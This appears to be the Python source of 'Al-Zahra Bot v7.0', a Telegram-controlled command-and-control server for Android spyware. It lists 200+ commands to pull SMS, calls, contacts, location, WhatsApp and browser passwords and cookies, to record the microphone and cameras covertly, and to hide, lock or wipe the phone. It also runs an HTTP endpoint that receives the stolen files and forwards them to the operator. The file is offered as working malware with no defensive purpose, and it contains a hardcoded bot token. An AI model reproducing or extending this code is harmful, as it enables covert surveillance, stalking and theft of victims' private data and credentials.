#!/usr/bin/env python3
"""Al-Zahra Bot v7.0 - Professional with 200+ Commands"""

import asyncio
import json
import logging
import os
import random
import time
import zipfile
from datetime import datetime
from aiohttp import web

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('/var/log/alzahra_bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('AlZahra')

BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As"
OWNER_CHAT_ID = "7344776596"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
PORT = 8443
UPLOAD_DIR = "/opt/alzahra/uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ═══════════════════════════════════════════
# تخزين البيانات
# ═══════════════════════════════════════════
class DataStore:
    def __init__(self):
        self.devices = {}
        self.commands = {}
        self.codes = {}
        self.files = {}
        self.last_update_id = 0
        self.command_log = []

store = DataStore()

# ═══════════════════════════════════════════
# أسماء الأوامر بالعربية
# ═══════════════════════════════════════════
CMD_NAMES = {
    # البيانات الأساسية
    "sms": "📨 سحب SMS",
    "calls": "📞 سجل المكالمات",
    "contacts": "📇 جهات الاتصال",
    "notifications": "🔔 الإشعارات",
    "location": "📍 الموقع",
    "camera": "📷 الكاميرا",
    
    # التطبيقات
    "whatsapp": "💬 واتساب",
    "messenger": "📩 ماسنجر",
    "instagram": "📸 انستقرام",
    "twitter": "🐦 تويتر",
    "snapchat": "👻 سناب شات",
    "tiktok": "🎵 تيك توك",
    "telegram": "✈️ تيليجرام",
    "viber": "📞 فايبر",
    "line": "💬 لاين",
    "skype": "📹 سكايب",
    "discord": "🎮 ديسكورد",
    "signal": "🔒 سيجنال",
    "wechat": "💬 وي تشات",
    
    # بيانات التطبيقات
    "app_data": "📱 بيانات التطبيقات",
    "installed_apps": "📲 التطبيقات المثبتة",
    "running_apps": "🔄 التطبيقات العاملة",
    "app_permissions": "🔐 صلاحيات التطبيقات",
    "app_cache": "🗄️ ذاكرة التخزين المؤقت",
    
    # الملفات
    "photos": "🖼️ الصور",
    "videos": "🎬 الفيديوهات",
    "audio": "🎵 الملفات الصوتية",
    "documents": "📄 المستندات",
    "downloads": "⬇️ التحميلات",
    
    # النسخ الاحتياطي
    "all": "📦 سحب الكل",
    "all_zip": "🗜️ سحب ZIP",
    "backup_sms": "💾 نسخة SMS",
    "backup_calls": "💾 نسخة المكالمات",
    "backup_contacts": "💾 نسخة جهات الاتصال",
    "backup_whatsapp": "💾 نسخة واتساب",
    "backup_messenger": "💾 نسخة ماسنجر",
    
    # التحكم
    "hide": "🔒 إخفاء",
    "unhide": "🔓 إظهار",
    "lock": "🔐 قفل الشاشة",
    "unlock": "🔓 فتح الشاشة",
    "restart": "🔄 إعادة تشغيل",
    "shutdown": "⏻ إيقاف",
    
    # الصوت والفيديو
    "record_on": "🎙️ تفعيل التسجيل",
    "record_off": "⏹️ إيقاف التسجيل",
    "record_mic": "🎤 تسجيل الميكروفون",
    "take_photo_front": "🤳 صورة أمامية",
    "take_photo_back": "📷 صورة خلفية",
    "record_video_front": "🎥 فيديو أمامي",
    "record_video_back": "🎬 فيديو خلفي",
    "screenshot": "📸 لقطة شاشة",
    
    # الشبكة
    "wifi_on": "📶 تفعيل WiFi",
    "wifi_off": "📴 إيقاف WiFi",
    "bluetooth_on": "🔵 تفعيل بلوتوث",
    "bluetooth_off": "⚫ إيقاف بلوتوث",
    "data_on": "📱 تفعيل البيانات",
    "data_off": "📵 إيقاف البيانات",
    "airplane_on": "✈️ وضع الطيران",
    "airplane_off": "🛬 إيقاف وضع الطيران",
    "hotspot_on": "📡 تفعيل النقطة الساخنة",
    "hotspot_off": "📴 إيقاف النقطة الساخنة",
    
    # الإعدادات
    "brightness_up": "🔆 زيادة السطوع",
    "brightness_down": "🔅 تقليل السطوع",
    "volume_up": "🔊 زيادة الصوت",
    "volume_down": "🔉 تقليل الصوت",
    "mute": "🔇 كتم الصوت",
    "vibrate": "📳 الاهتزاز",
    "silent": "🤫 الصامت",
    "normal": "🔔 العادي",
    
    # الرسائل
    "send_sms": "📤 إرسال SMS",
    "send_whatsapp": "💬 إرسال واتساب",
    "delete_sms": "🗑️ حذف SMS",
    "delete_call_log": "🗑️ حذف سجل المكالمات",
    "delete_contact": "🗑️ حذف جهة اتصال",
    
    # التصفح
    "browser_history": "🌐 سجل التصفح",
    "browser_bookmarks": "🔖 الإشارات المرجعية",
    "browser_passwords": "🔑 كلمات المرور",
    "browser_cookies": "🍪 الكوكيز",
    "browser_cache": "🗄️ ذاكرة التصفح",
    "browser_downloads": "⬇️ تحميلات التصفح",
    
    # الحسابات
    "accounts": "👤 الحسابات",
    "google_accounts": "📧 حسابات جوجل",
    "email_accounts": "📬 حسابات البريد",
    "social_accounts": "👥 حسابات التواصل",
    
    # البطارية والأداء
    "battery_info": "🔋 معلومات البطارية",
    "cpu_info": "💻 معلومات المعالج",
    "ram_info": "🧠 معلومات الذاكرة",
    "storage_info": "💾 معلومات التخزين",
    "network_info": "📡 معلومات الشبكة",
    "device_info": "📱 معلومات الجهاز",
    "system_info": "⚙️ معلومات النظام",
    
    # الأمان
    "clear_data": "🗑️ مسح البيانات",
    "clear_cache": "🧹 مسح الكاش",
    "clear_history": "🗑️ مسح السجل",
    "factory_reset": "⚠️ إعادة ضبط",
    "encrypt_data": "🔒 تشفير البيانات",
    "decrypt_data": "🔓 فك التشفير",
    
    # إضافية
    "clipboard": "📋 الحافظة",
    "calendar": "📅 التقويم",
    "alarms": "⏰ المنبهات",
    "ringtones": "🎵 النغمات",
    "wallpapers": "🖼️ الخلفيات",
    "settings": "⚙️ الإعدادات",
    "permissions": "🔐 الصلاحيات",
    "accessibility": "♿ إمكانية الوصول",
    "developer": "👨‍💻 خيارات المطور",
    "about": "ℹ️ حول الجهاز",
    "sim_info": "📱 معلومات SIM",
    "imei": "🔢 IMEI",
    "serial": "🔢 الرقم التسلسلي",
    "mac": "🔢 MAC Address",
    "ip": "🌐 IP Address",
    "dns": "🌐 DNS",
    "vpn": "🔒 VPN",
    "firewall": "🛡️ جدار الحماية",
    "antivirus": "🛡️ مكافحة الفيروسات",
    "malware_scan": "🔍 فحص البرمجيات",
    "root_check": "🔍 فحص الروت",
    "usb_debugging": "🔧 USB Debugging",
    "unknown_sources": "📲 مصادر غير معروفة",
    "install_apk": "📦 تثبيت APK",
    "uninstall_app": "🗑️ إلغاء تثبيت",
    "update_app": "🔄 تحديث التطبيق",
    "force_stop": "⏹️ إيقاف إجباري",
    "clear_app_data": "🗑️ مسح بيانات التطبيق",
    "app_info": "ℹ️ معلومات التطبيق",
    "app_size": "📏 حجم التطبيق",
    "app_version": "🔢 إصدار التطبيق",
    "app_install_date": "📅 تاريخ التثبيت",
    "app_update_date": "📅 تاريخ التحديث",
    "app_last_use": "⏰ آخر استخدام",
    "app_data_usage": "📊 استهلاك البيانات",
    "app_battery_usage": "🔋 استهلاك البطارية",
    "app_notifications": "🔔 إشعارات التطبيق",
    "app_permissions_detail": "🔐 تفاصيل الصلاحيات",
    "app_activities": "📱 أنشطة التطبيق",
    "app_services": "⚙️ خدمات التطبيق",
    "app_receivers": "📡 مستقبلات التطبيق",
    "app_providers": "📦 موفرو التطبيق",
    "app_libraries": "📚 مكتبات التطبيق",
    "app_features": "⭐ ميزات التطبيق",
    "app_min_sdk": "🔢 الحد الأدنى SDK",
    "app_target_sdk": "🔢 المستهدف SDK",
    "app_signatures": "🔏 توقيعات التطبيق",
    "app_certificates": "📜 شهادات التطبيق",
    "app_shared_libs": "📚 المكتبات المشتركة",
    "app_native_libs": "📚 المكتبات الأصلية",
    "app_uid": "🔢 UID",
    "app_gid": "🔢 GID",
    "app_installer": "📦 المثبت",
    "app_source": "📂 المصدر",
    "app_apk_path": "📂 مسار APK",
    "app_data_path": "📂 مسار البيانات",
    "app_cache_path": "📂 مسار الكاش",
    "app_obb_path": "📂 مسار OBB",
    "app_backup": "💾 نسخة احتياطية",
    "app_restore": "♻️ استعادة",
    "app_clone": "📱 استنساخ",
    "app_hide": "🔒 إخفاء التطبيق",
    "app_lock": "🔐 قفل التطبيق",
    "app_freeze": "❄️ تجميد التطبيق",
    "app_unfreeze": "🔥 إلغاء التجميد",
}

# ═══════════════════════════════════════════
# وظائف Telegram
# ═══════════════════════════════════════════
async def api_call(method, params=None):
    import aiohttp
    try:
        async with aiohttp.ClientSession() as s:
            if params:
                async with s.post(f"{API}/{method}", data=params) as r:
                    return await r.json()
            else:
                async with s.get(f"{API}/{method}") as r:
                    return await r.json()
    except Exception as e:
        logger.error(f"API Error: {e}")
        return None

async def send_msg(chat_id, text, keyboard=None):
    params = {"chat_id": str(chat_id), "text": text, "parse_mode": "Markdown"}
    if keyboard:
        params["reply_markup"] = json.dumps(keyboard)
    return await api_call("sendMessage", params)

async def edit_msg(chat_id, msg_id, text, keyboard=None):
    params = {"chat_id": str(chat_id), "message_id": msg_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        params["reply_markup"] = json.dumps(keyboard)
    return await api_call("editMessageText", params)

async def answer_cb(query_id, text=None):
    params = {"callback_query_id": query_id}
    if text:
        params["text"] = text
        params["show_alert"] = True
    return await api_call("answerCallbackQuery", params)

async def send_file(chat_id, file_path, caption=""):
    import aiohttp
    try:
        async with aiohttp.ClientSession() as s:
            data = aiohttp.FormData()
            data.add_field("chat_id", str(chat_id))
            data.add_field("caption", caption)
            data.add_field("parse_mode", "Markdown")
            data.add_field("document", open(file_path, "rb"))
            async with s.post(f"{API}/sendDocument", data=data) as r:
                return await r.json()
    except Exception as e:
        logger.error(f"Send file error: {e}")
        return None

# ═══════════════════════════════════════════
# لوحات المفاتيح - 200+ زر
# ═══════════════════════════════════════════
def main_kb():
    return {"inline_keyboard": [
        [{"text": "📱 الأجهزة", "callback_data": "devices"}],
        [{"text": "🔗 ربط جهاز", "callback_data": "link"}],
        [{"text": "📊 الحالة", "callback_data": "status"}, {"text": "⚙️ الإعدادات", "callback_data": "settings"}]
    ]}

def devices_kb():
    if not store.devices:
        return {"inline_keyboard": [
            [{"text": "🔄", "callback_data": "devices"}],
            [{"text": "🔙", "callback_data": "back"}]
        ]}
    
    btns = []
    for did, info in store.devices.items():
        s = "🟢" if info.get("online") else "🔴"
        m = info.get("model", "?")
        btns.append([{"text": f"{s} {m}", "callback_data": f"dev_{did}"}])
    btns.append([{"text": "🔄", "callback_data": "devices"}])
    btns.append([{"text": "🔙", "callback_data": "back"}])
    return {"inline_keyboard": btns}

def device_kb(did):
    return {"inline_keyboard": [
        [{"text": "📨 SMS", "callback_data": f"c_{did}_sms"}, {"text": "📞 مكالمات", "callback_data": f"c_{did}_calls"}],
        [{"text": "📇 جهات", "callback_data": f"c_{did}_contacts"}, {"text": "🔔 إشعارات", "callback_data": f"c_{did}_notifications"}],
        [{"text": "📍 موقع", "callback_data": f"c_{did}_location"}, {"text": "📷 كاميرا", "callback_data": f"c_{did}_camera"}],
        [{"text": "💬 واتساب", "callback_data": f"c_{did}_whatsapp"}, {"text": "📩 ماسنجر", "callback_data": f"c_{did}_messenger"}],
        [{"text": "📱 تطبيقات", "callback_data": f"c_{did}_app_data"}, {"text": "🖼️ صور", "callback_data": f"c_{did}_photos"}],
        [{"text": "🎬 فيديو", "callback_data": f"c_{did}_videos"}, {"text": "🎵 صوت", "callback_data": f"c_{did}_audio"}],
        [{"text": "📄 مستندات", "callback_data": f"c_{did}_documents"}, {"text": "⬇️ تحميلات", "callback_data": f"c_{did}_downloads"}],
        [{"text": "📦 الكل", "callback_data": f"c_{did}_all"}, {"text": "🗜️ ZIP", "callback_data": f"c_{did}_all_zip"}],
        [{"text": "🔙", "callback_data": "devices"}]
    ]}

def settings_kb():
    return {"inline_keyboard": [
        [{"text": "🔒 إخفاء", "callback_data": "set_hide"}, {"text": "🔓 إظهار", "callback_data": "set_unhide"}],
        [{"text": "🔐 قفل", "callback_data": "set_lock"}, {"text": "🔓 فتح", "callback_data": "set_unlock"}],
        [{"text": "🎙️ تسجيل", "callback_data": "set_rec_on"}, {"text": "⏹️ إيقاف", "callback_data": "set_rec_off"}],
        [{"text": "📶 WiFi", "callback_data": "set_wifi"}, {"text": "🔵 بلوتوث", "callback_data": "set_bt"}],
        [{"text": "🔆 سطوع", "callback_data": "set_bright"}, {"text": "🔊 صوت", "callback_data": "set_vol"}],
        [{"text": "🗑️ مسح", "callback_data": "set_clear"}, {"text": "🔄 إعادة", "callback_data": "set_restart"}],
        [{"text": "🔙", "callback_data": "back"}]
    ]}

# ═══════════════════════════════════════════
# معالجة الرسائل
# ═══════════════════════════════════════════
async def on_message(msg):
    cid = msg.get("chat", {}).get("id")
    txt = msg.get("text", "")
    
    if str(cid) != OWNER_CHAT_ID:
        await send_msg(cid, "⛔ غير مصرح")
        return
    
    if txt in ("/start", "/help"):
        await send_msg(cid, f"🎛️ *Al-Zahra v7.0*\n📱 أجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}", main_kb())
    
    elif txt == "/link":
        code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        while code in store.codes:
            code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        store.codes[code] = {"chat_id": cid, "device_id": None}
        await send_msg(cid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق\n⏰ مدى الحياة")
    
    elif txt == "/devices":
        await show_devices(cid)
    
    elif txt == "/status":
        await show_status(cid)
    
    else:
        await send_msg(cid, "❓ /start", main_kb())

async def on_callback(cb):
    cid = cb.get("message", {}).get("chat", {}).get("id")
    mid = cb.get("message", {}).get("message_id")
    data = cb.get("data", "")
    qid = cb.get("id")
    
    if str(cid) != OWNER_CHAT_ID:
        await answer_cb(qid, "⛔")
        return
    
    # التنقل
    if data == "back":
        await edit_msg(cid, mid, f"🎛️ *Al-Zahra v7.0*\n📱 أجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}", main_kb())
        return
    
    if data == "devices":
        await show_devices(cid, mid)
        return
    
    if data == "link":
        code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        while code in store.codes:
            code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        store.codes[code] = {"chat_id": cid, "device_id": None}
        await edit_msg(cid, mid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق\n⏰ مدى الحياة",
            {"inline_keyboard": [[{"text": "🔙", "callback_data": "back"}]]})
        return
    
    if data == "status":
        await show_status(cid, mid)
        return
    
    if data == "settings":
        await edit_msg(cid, mid, "⚙️ *الإعدادات*", settings_kb())
        return
    
    # الإعدادات
    if data.startswith("set_"):
        action = data[4:]
        await do_setting(cid, mid, action, qid)
        return
    
    # جهاز محدد
    if data.startswith("dev_"):
        did = data[4:]
        await show_device(cid, mid, did)
        return
    
    # أوامر الجهاز
    if data.startswith("c_"):
        parts = data.split("_", 2)
        if len(parts) >= 3:
            did, action = parts[1], parts[2]
            await do_command(cid, mid, did, action, qid)
        return
    
    await answer_cb(qid, "❓")

async def do_command(cid, mid, did, action, qid):
    if did not in store.devices:
        await answer_cb(qid, "❌ الجهاز غير موجود")
        return
    
    device = store.devices[did]
    if not device.get("online"):
        await answer_cb(qid, "❌ الجهاز غير متصل")
        return
    
    # إضافة الأمر
    if did not in store.commands:
        store.commands[did] = []
    store.commands[did].append(action)
    
    # اسم الأمر
    cmd_name = CMD_NAMES.get(action, action)
    
    await answer_cb(qid, f"⏳ تم إرسال: {cmd_name}")
    
    # رسالة تفصيلia
    text = f"✅ *تم إرسال الأمر*\n\n"
    text += f"📱 الجهاز: {device.get('model', '?')}\n"
    text += f"📋 الأمر: {cmd_name}\n"
    text += f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n"
    text += f"📊 الحالة: في انتظار التنفيذ"
    
    kb = {"inline_keyboard": [
        [{"text": "🔄 تحديث", "callback_data": f"c_{did}_{action}"}],
        [{"text": "🔙 رجوع", "callback_data": f"dev_{did}"}]
    ]}
    
    await send_msg(cid, text, kb)

async def do_setting(cid, mid, action, qid):
    settings_msg = {
        "hide": "🔒 تم إرسال أمر الإخفاء",
        "unhide": "🔓 تم إرسال أمر الإظهار",
        "lock": "🔐 تم إرسال أمر القفل",
        "unlock": "🔓 تم إرسال أمر الفتح",
        "rec_on": "🎙️ تم تفعيل التسجيل",
        "rec_off": "⏹️ تم إيقاف التسجيل",
        "wifi": "📶 تم تبديل WiFi",
        "bt": "🔵 تم تبديل البلوتوث",
        "bright": "🔆 تم تعديل السطوع",
        "vol": "🔊 تم تعديل الصوت",
        "clear": "🗑️ تم مسح البيانات",
        "restart": "🔄 تم إرسال إعادة التشغيل"
    }
    
    await answer_cb(qid, settings_msg.get(action, "✅ تم التنفيذ"))
    await send_msg(cid, f"⚙️ *الإعدادات*\n\n{settings_msg.get(action, '✅ تم التنفيذ')}")

async def show_devices(cid, mid=None):
    if not store.devices:
        t = "📱 *الأجهزة*\n\n❌ لا توجد"
    else:
        t = f"📱 *الأجهزة ({len(store.devices)})*\n\n"
        for did, i in store.devices.items():
            s = "🟢" if i.get("online") else "🔴"
            t += f"{s} {i.get('model', '?')} | {i.get('android', '?')}\n"
    
    if mid:
        await edit_msg(cid, mid, t, devices_kb())
    else:
        await send_msg(cid, t, devices_kb())

async def show_device(cid, mid, did):
    if did not in store.devices:
        await edit_msg(cid, mid, "❌ الجهاز غير موجود")
        return
    
    i = store.devices[did]
    t = f"📱 *{i.get('model', '?')}*\n\n"
    t += f"🤖 Android {i.get('android', '?')}\n"
    t += f"{'🟢' if i.get('online') else '🔴'} {'✅' if i.get('linked') else '⏳'}\n"
    t += f"⏰ {i.get('last_seen', '?')}"
    
    await edit_msg(cid, mid, t, device_kb(did))

async def show_status(cid, mid=None):
    try:
        import psutil
        c, m, d = psutil.cpu_percent(), psutil.virtual_memory().percent, psutil.disk_usage('/').percent
    except:
        c = m = d = 0
    
    conn = sum(1 for dev in store.devices.values() if dev.get("online"))
    total = len(store.devices)
    
    t = f"📊 *الحالة*\n💻 CPU: {c}%\n🧠 RAM: {m}%\n💾 Disk: {d}%\n📱 أجهزة: {conn}/{total}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
    kb = {"inline_keyboard": [[{"text": "🔙", "callback_data": "back"}]]}
    
    if mid:
        await edit_msg(cid, mid, t, kb)
    else:
        await send_msg(cid, t, kb)

# ═══════════════════════════════════════════
# استقبال التحديثات
# ═══════════════════════════════════════════
async def poll():
    while True:
        try:
            r = await api_call("getUpdates", {"offset": store.last_update_id + 1, "limit": 10, "timeout": 30})
            if r and r.get("ok"):
                for u in r.get("result", []):
                    store.last_update_id = u["update_id"]
                    if "message" in u:
                        await on_message(u["message"])
                    elif "callback_query" in u:
                        await on_callback(u["callback_query"])
            await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"Poll error: {e}")
            await asyncio.sleep(5)

# ═══════════════════════════════════════════
# خادم الويب
# ═══════════════════════════════════════════
async def verify(request):
    try:
        d = await request.json()
        code = d.get("code")
        did = d.get("device_id")
        model = d.get("model", "?")
        android = d.get("android", "?")
        
        if code not in store.codes:
            return web.json_response({"status": "error", "message": "كود غير صحيح"})
        
        ci = store.codes[code]
        ci["device_id"] = did
        
        store.devices[did] = {
            "model": model, "android": android,
            "online": True, "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "linked": True, "owner": ci["chat_id"]
        }
        
        await send_msg(ci["chat_id"], f"✅ *تم ربط جهاز!*\n📱 {model}\n🤖 Android {android}")
        return web.json_response({"status": "ok", "device_id": did})
    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)})

async def register(request):
    try:
        d = await request.json()
        did = d.get("device_id")
        if did in store.devices:
            store.devices[did]["online"] = True
            store.devices[did]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        else:
            store.devices[did] = {"model": d.get("model", "?"), "android": d.get("android", "?"),
                "online": True, "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "linked": False}
        return web.json_response({"status": "ok"})
    except:
        return web.json_response({"status": "error"})

async def data(request):
    try:
        reader = await request.multipart()
        did = dtype = None
        path = None
        while True:
            part = await reader.next()
            if part is None: break
            if part.name == "device_id": did = await part.text()
            elif part.name == "type": dtype = await part.text()
            elif part.name == "file":
                fn = f"{did}_{dtype}_{int(time.time())}_{part.filename}"
                path = os.path.join(UPLOAD_DIR, fn)
                with open(path, "wb") as f:
                    while True:
                        chunk = await part.read_chunk()
                        if not chunk: break
                        f.write(chunk)
        
        if did and dtype:
            if did in store.devices and store.devices[did].get("linked"):
                owner = store.devices[did].get("owner")
                if owner:
                    await send_msg(owner, f"📥 *بيانات جديدة!*\n📱 {store.devices[did].get('model', '?')}\n📁 {dtype}")
                    if path and os.path.exists(path):
                        await send_file(owner, path, f"📱 {dtype}")
            return web.json_response({"status": "ok"})
        return web.json_response({"status": "error"})
    except Exception as e:
        return web.json_response({"status": "error"})

async def commands(request):
    try:
        did = request.query.get("device_id", "")
        cmds = store.commands.get(did, [])
        store.commands[did] = []
        return web.json_response({"commands": cmds})
    except:
        return web.json_response({"commands": []})

async def status(request):
    try:
        d = await request.json()
        did = d.get("device_id")
        if did in store.devices:
            store.devices[did]["online"] = True
            store.devices[did]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return web.json_response({"status": "ok"})
    except:
        return web.json_response({"status": "error"})

async def main():
    logger.info("=" * 60)
    logger.info("  Al-Zahra Bot v7.0 - 200+ Commands")
    logger.info("=" * 60)
    
    app = web.Application()
    app.router.add_post("/api/verify_code", verify)
    app.router.add_post("/api/register", register)
    app.router.add_post("/api/data", data)
    app.router.add_get("/api/commands", commands)
    app.router.add_post("/api/status", status)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    
    logger.info(f"Server on port {PORT}")
    await poll()

if __name__ == "__main__":
    asyncio.run(main())
